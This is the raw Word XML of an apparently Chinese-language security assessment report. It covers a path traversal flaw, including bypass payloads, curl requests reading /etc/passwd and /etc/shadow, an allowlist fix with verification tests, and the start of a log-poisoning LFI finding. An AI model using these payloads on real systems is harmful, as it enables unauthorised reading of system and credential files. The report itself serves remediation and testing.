            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>....//....//</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> → 等效于 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>../../</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>..//</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> 目录穿越，黑名单仅查 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>../</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>绝对路径绕过</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/etc/passwd</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> → </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>os.path.join("pages", "/etc/passwd")</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> → </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/etc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Python os.path.join 的绝对路径特性</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Unicode 编码绕过</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>..%c0%af</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> → UTF-8 过长的斜杠字符</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>IIS/部分中间件的编码漏洞</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>空字节截断</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>../../etc/passwd%00.html</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> → 截断 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>.html</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> 后缀</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>C 语言风格的空字节字符串终止</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># 实际攻击请求示例</w:t>
        <w:br/>
        <w:t>curl "http://target/page?name=%252e%252e%252f%252e%252e%252fetc/passwd"</w:t>
        <w:br/>
        <w:t>curl "http://target/page?name=....//....//....//etc/shadow"</w:t>
        <w:br/>
        <w:t>curl "http://target/page?name=/etc/passwd"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>安全危害</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 绕过型攻击放大器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">：即使后期运维人员添加了简单的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>../</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 黑名单过滤，这些绕过技术仍可成功利用，大幅延长漏洞的有效期</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• WAF/IPS 绕过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">：常见的 Web 应用防火墙规则通常仅拦截标准 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>../</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，编码/变形后的 payload 可轻松绕过</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 降低攻击门槛</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：多种绕过方式中只要有一种生效，攻击者即可完成文件读取，防御成本远高于攻击成本</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>白名单方案从根本上杜绝了所有编码绕过——</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>只有白名单内的名称会被处理，任何非白名单输入（包括编码后的路径穿越 payload）都返回 404</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># 白名单校验在 URL 解码后执行</w:t>
        <w:br/>
        <w:t>name = request.args.get("name", "")</w:t>
        <w:br/>
        <w:t>if name not in ALLOWED_PAGES:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return "页面不存在", 404</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">同时增加 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>os.path.realpath()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 二次防护，即使存在未知绕过也能确保路径被锁定在 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>pages/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录内。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复效果验证</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>测试用例</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>预期结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>实际结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/page?name=%252e%252e%252fetc/passwd</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>（双层编码）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>返回 404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 已阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/page?name=....//....//....//etc/passwd</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>（双斜杠）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>返回 404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 已阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/page?name=/etc/passwd</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>（绝对路径）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>返回 404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 已阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>【漏洞 4】日志投毒 + LFI 远程代码执行（CWE-73/CWE-98）</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4703"/>
        <w:gridCol w:w="4703"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>条目</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞接口</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">SSH 日志投毒 + </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>GET /page?name=../../var/log/auth.log</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>原始风险等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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高危</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
